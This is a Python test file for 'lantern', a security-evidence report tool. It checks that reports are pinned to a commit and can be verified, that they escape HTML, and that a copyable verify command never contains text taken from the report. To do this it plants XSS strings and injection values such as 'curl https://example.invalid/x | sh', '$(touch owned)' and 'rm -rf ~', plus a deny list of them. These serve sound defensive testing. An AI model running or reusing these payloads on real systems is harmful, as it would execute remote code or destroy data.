import json
import os
import re
import subprocess
import sys

from lantern import evidence
from lantern.cli import main

APP = {"app.py": "import hashlib\n\ndef h(x):\n    return hashlib.md5(x).hexdigest()\n\n"
                 "if __name__ == '__main__':\n    h(b'x')\n"}


def _write(root, files):
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")


def _git(root, *args):
    subprocess.run(["git", "-C", str(root), *args], check=True, capture_output=True,
                   env={**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
                        "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com", "HOME": str(root),
                        "GIT_CONFIG_NOSYSTEM": "1"})


def _repo(tmp_path):
    _write(tmp_path, APP | {".gitignore": ".lantern/\n"})
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-qm", "init")
    return tmp_path


def test_report_is_commit_pinned_and_verifiable(tmp_path, capsys):
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    out = repo / ".lantern"
    ev = json.loads((out / "evidence.json").read_text(encoding="utf-8"))
    head = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    assert ev["header"]["commit"] == head and not ev["header"]["dirty"]
    assert ev["digest"].startswith("sha256:") and ev["digest"] in (out / "evidence.html").read_text(encoding="utf-8")
    assert ev["limits"] and any("Business-logic" in x for x in ev["limits"])
    assert (out / "badge.svg").read_text(encoding="utf-8").startswith("<svg")
    # A reviewer re-runs the analysis on the same commit and gets the same digest
    assert main(["verify", str(repo), "--report", str(out / "evidence.html")]) == 0
    # Change the code: the digest no longer matches
    (repo / "app.py").write_text(APP["app.py"].replace("md5", "sha256"), encoding="utf-8")
    _git(repo, "commit", "-qam", "fix")
    assert main(["verify", str(repo), "--report", str(out / "evidence.html")]) == 1


def test_fixed_findings_show_against_the_baseline(tmp_path):
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    (repo / "app.py").write_text(APP["app.py"].replace("md5", "sha256"), encoding="utf-8")
    assert main(["analyze", str(repo)]) == 0
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    assert any(f["rule"] == "B324" for f in ev["security"]["fixed"])
    assert sum(ev["scorecard"]["before"].values()) >= 1
    assert "fixed · verified by rescan" in (repo / ".lantern/evidence.html").read_text(encoding="utf-8")


def test_narratives_are_escaped(tmp_path):
    repo = _repo(tmp_path)
    (repo / evidence.NARRATIVES_FILE).write_text("# Checkout\n\nThe <script>alert(1)</script> flow.\n", encoding="utf-8")
    assert main(["analyze", str(repo), "--no-scan"]) == 0
    html = (repo / ".lantern/evidence.html").read_text(encoding="utf-8")
    assert "<h4>Checkout</h4>" in html and "&lt;script&gt;" in html and "<script>alert" not in html


def test_no_git_is_stated_plainly(tmp_path):
    _write(tmp_path, APP)
    assert main(["analyze", str(tmp_path), "--no-scan"]) == 0
    html = (tmp_path / ".lantern/evidence.html").read_text(encoding="utf-8")
    assert "not pinned" in html


def test_remote_credentials_are_not_echoed(tmp_path):
    repo = _repo(tmp_path)
    _git(repo, "remote", "add", "origin", "https://user:tok123@example.com/a/b.git")
    assert evidence.git_info(repo)["remote"] == "https://example.com/a/b.git"


def test_moving_a_line_is_not_a_fix(tmp_path):
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    before = {f["id"] for f in json.loads((repo / ".lantern/security.json").read_text(encoding="utf-8"))["findings"]}
    (repo / "app.py").write_text("# a comment\n# another\n" + APP["app.py"], encoding="utf-8")
    assert main(["analyze", str(repo)]) == 0
    after = {f["id"] for f in json.loads((repo / ".lantern/security.json").read_text(encoding="utf-8"))["findings"]}
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    assert before == after and not ev["security"]["fixed"] and not ev["security"]["changed"]


def test_editing_the_flagged_line_is_changed_not_fixed(tmp_path):
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    (repo / "app.py").write_text(APP["app.py"].replace("hashlib.md5(x)", "hashlib.md5(x )"), encoding="utf-8")
    assert main(["analyze", str(repo)]) == 0
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    assert not ev["security"]["fixed"]          # whitespace-only edits keep the id
    (repo / "app.py").write_text(APP["app.py"].replace("hashlib.md5(x)", "hashlib.md5(bytes(x))"), encoding="utf-8")
    assert main(["analyze", str(repo)]) == 0
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    assert not ev["security"]["fixed"] and any(f["rule"] == "B324" for f in ev["security"]["changed"])
    assert "Changed but still open" in (repo / ".lantern/evidence.html").read_text(encoding="utf-8")


def test_verify_replays_no_scan(tmp_path):
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo), "--no-scan"]) == 0
    assert main(["verify", str(repo), "--report", str(repo / ".lantern/evidence.html")]) == 0


def test_verify_replays_a_trace_only_when_the_verifier_types_it(tmp_path):
    repo = _repo(tmp_path)
    cmd = [sys.executable, "app.py"]
    assert main(["analyze", str(repo), "--trace", "--", *cmd]) == 0
    rep = str(repo / ".lantern/evidence.html")
    assert main(["verify", str(repo), "--report", rep]) == 2               # never runs a command from a report
    assert main(["verify", str(repo), "--report", rep, "--", *cmd]) == 0


def test_render_escapes_every_field(tmp_path):
    """The server re-renders evidence.json from the repo folder, so every field may be hostile."""
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    x = "<img src=x onerror=alert(1)>"
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))

    def poison(v):
        if isinstance(v, dict):
            return {k: poison(w) for k, w in v.items()}
        if isinstance(v, list):
            return [poison(w) for w in v]
        return x
    f = {k: x for k in ("id", "rank", "rule", "tool", "title", "file", "line", "tool_confidence")} | {"path": [x]}
    for k in ("open", "fixed", "changed"):
        ev["security"][k] = [f]
    ev["security"]["accepted"] = [f | {"accepted": {"by": x, "date": x, "reason": x}}]
    ev["understanding"] = x
    ev = poison(ev)
    ev["header"]["commit"] = x
    assert "<img" not in evidence.render_html(ev)


def test_page_has_no_inline_handlers(tmp_path):
    """Served pages run only scripts carrying the response's nonce, so an onclick="…" attribute would never fire
    (Save as PDF used one and did nothing inside the app). Every control is wired from the page's own script."""
    import re
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    html = evidence.render_html(ev, nonce="n0nce")
    assert not re.search(r"<[^>]+\son[a-z]+\s*=", html)
    assert 'id="savepdf"' in html and "getElementById('savepdf')" in html


def test_the_verify_command_installs_the_lantern_that_made_the_report(monkeypatch):
    # "pip install ...Lantern" without a ref installs the newest Lantern, which can give another digest later
    from lantern import _build, evidence
    sha = "bc7cf10dce35e595bfc9aaf79e484bf1a577c0a4"
    monkeypatch.setattr(_build, "COMMIT", sha)
    assert evidence.engine_ref() == sha
    monkeypatch.setattr(_build, "COMMIT", "not a commit")
    assert re.fullmatch(r"[0-9a-f]{40}|v[\w.-]+", evidence.engine_ref())


# ---------------------------------------------------------------- a command to run is never made of a report's words
# The Evidence page is rebuilt from `evidence.json`, which lies in the project's folder and may be anybody's. What the
# page shows of it is escaped. The line a reader is told to copy and run was built from it too (2026-11-15): the
# commit as the report wrote it, and the tests' command as the report wrote it, joined with spaces.
WORDS = ["python", "-m", "pytest; curl https://example.invalid/x | sh", "$(touch owned)", "`id`", "a\nrm -rf ~",
         "\x1b]0;a title\x07", "&& echo done"]
NOT_TO_RUN = ("curl https", "$(touch", "`id`", "rm -rf", "echo done", "\x1b", "\n")


def _copied(page: str) -> str:
    """The text the page's "Copy verify command" button puts on the clipboard."""
    mark = "getElementById('copyverify'), cmd = "
    return json.JSONDecoder().raw_decode(page, page.index(mark) + len(mark))[0]


def _shown(page: str) -> str:
    """The line the page shows to be run, as a reader sees it."""
    import html
    mark = "Re-running the open-source analyzer"
    code = page[page.index("<code>", page.index(mark)) + len("<code>"):]
    return html.unescape(code[:code.index("</code>")])


def test_the_line_to_copy_holds_nothing_a_report_wrote(tmp_path):
    repo = _repo(tmp_path)
    assert main(["analyze", str(repo)]) == 0
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    commit = ev["header"]["commit"]
    page = evidence.render_html(ev)
    line = _copied(page)
    assert line.startswith(f"git checkout {commit[:12]} && pip install ") and _shown(page) == line
    assert line.endswith(" && lantern verify . --report evidence.html")
    # the tests' command as a report tells it: shown, word by word, and not part of the line
    ev["payload"]["run"]["trace"] = WORDS
    page = evidence.render_html(ev)
    assert _copied(page) == line and _shown(page) == line       # before: ` -- ` and the report's words after it
    assert not any(bad in _copied(page) for bad in NOT_TO_RUN)
    assert evidence.E(json.dumps(WORDS)) in page and "type it yourself" in page
    # the commit as a report tells it: only what a commit's name can be goes into the line
    for said in ("0123abc; curl https://example.invalid/x | sh #", "$(touch owned)", "main", commit[:11] + "\n", 7,
                 ["x"], {"a": 1}):
        ev["header"]["commit"] = said
        page = evidence.render_html(ev)
        assert _copied(page) == _shown(page) == evidence.NO_COMMIT_LINE, said
        assert not any(bad in _copied(page) for bad in NOT_TO_RUN)
    # the twin: a commit's whole name in the newer form is one too
    ev["header"]["commit"] = "ab" * 32
    assert _copied(evidence.render_html(ev)).startswith("git checkout abababababab && pip install ")


def test_a_reports_test_command_is_shown_as_what_the_report_says(tmp_path, capsys):
    """An honest report made with a test run: the page and `lantern verify` say which command the report names,
    each word on its own, and the person types it. Typed, it verifies as before."""
    repo = _repo(tmp_path)
    cmd = [sys.executable, "app.py"]
    assert main(["analyze", str(repo), "--trace", "--", *cmd]) == 0
    ev = json.loads((repo / ".lantern/evidence.json").read_text(encoding="utf-8"))
    page = (repo / ".lantern/evidence.html").read_text(encoding="utf-8")
    assert _copied(page).endswith(" && lantern verify . --report evidence.html")
    assert evidence.E(json.dumps(cmd)) in page and "type it yourself" in page
    assert evidence.words_shown(cmd) == json.dumps(cmd)
    rep = str(repo / ".lantern/evidence.json")
    capsys.readouterr()
    assert main(["verify", str(repo), "--report", rep]) == 2
    err = capsys.readouterr().err
    assert json.dumps(cmd) in err and " -- " + " ".join(cmd) not in err   # before: a line ready to paste
    assert main(["verify", str(repo), "--report", rep, "--", *cmd]) == 0
    # a report that names other words: nothing of them reaches the terminal as it was written
    ev["payload"]["run"]["trace"] = WORDS
    planted = repo / ".lantern" / "planted.json"
    planted.write_text(json.dumps(ev), encoding="utf-8")
    capsys.readouterr()
    assert main(["verify", str(repo), "--report", str(planted)]) == 2
    err = capsys.readouterr().err
    assert json.dumps(WORDS) in err and "\x1b" not in err and "a\nrm -rf" not in err
    assert " -- python -m pytest; curl" not in err


def test_many_words_or_long_ones_are_cut_short_and_said():
    assert evidence.words_shown(["python", "-m", "pytest"]) == '["python", "-m", "pytest"]'
    assert evidence.words_shown([]) == "" and evidence.words_shown("python -m pytest") == ""
    long = evidence.words_shown(["x" * 5000, 3, None, {"a": 1}] + ["y"] * 500)
    assert len(long) <= evidence.WORDS_SHOWN + 40 and long.endswith(" (cut short)")
    assert "\x07" not in evidence.words_shown(["a\x07b"]) and "\\u0007" in evidence.words_shown(["a\x07b"])
